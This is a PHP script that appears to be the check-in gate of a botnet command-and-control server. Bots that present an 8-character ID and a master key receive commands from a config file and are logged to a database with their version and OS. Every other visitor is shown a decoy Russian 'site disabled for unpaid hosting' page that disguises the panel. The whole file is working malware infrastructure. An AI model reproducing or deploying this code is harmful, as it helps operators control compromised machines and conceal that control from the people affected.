<?php 

    $uid=( isset( $_GET['uid'] ) ) ? $_GET['uid']:0;

    if ( $uid && strlen( $uid ) == 8 ) 
	{ 
	   define( "FILE", true );
	   include( "inc/config.php" );
	   include( "inc/functions.php" );

 	   if( $_GET['mk'] == $conf['masterkey'] )
	   {     
              if( $conf['command'] != 'd3Rm' )	
              {		  
		 print( $conf['command'] );
	      }
              else
	      {
         	 print( $conf['command_unpriority'] );	  
	      }	
 	   } 
	   else 
	   {       
	      print( "d3Rm" ); 
	      exit();
 	   }

	   mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
	   mysql_select_db( $conf['dbname'] );	
   
	   get_bot( $uid, substr( $_GET['ver'], 0, 7 ), substr( $_GET['c'], 0, 7 ), substr( $_GET['os'], 0, 7), substr( $_GET['rs'], 0, 7 ), substr( $_GET['rq'], 0, 10 ) );
	   
	   mysql_close();
       } 
       else 
       { 
	   echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">   <HTML><HEAD><TITLE>Сайт отключен</TITLE>   <META http-equiv=Content-Type content="text/html; charset=windows-1251">   <META content="MSHTML 6.00.6000.16809" name=GENERATOR></HEAD>   <BODY>   <DIV style="BACKGROUND: #ffffff; LEFT: 28%; FONT: 14px Arial; WIDTH: 60%; COLOR: #333333; POSITION: absolute; TOP: 200px">   <DIV style="BORDER-RIGHT: #666666 1px solid; PADDING-RIGHT: 20px; PADDING-LEFT: 0px; FLOAT: left; PADDING-BOTTOM: 0px; MARGIN: 0px 20px 100px 0px; PADDING-TOP: 3px"><IMG height=68 src="logo.gif" width=70> </DIV><B><FONT color=red>Внимание!</FONT></B><BR>Сайт отключен. Возможно, это связано с неоплатой счета за хостинг.<BR>Свяжитесь со службой технической поддержки по телефону: (495) 542-39-84 или e-mail: <A href="mailto:info@intellectdesign.ru">info@intellectdesign.ru</A> </DIV></BODY></HTML>';
       } 

?>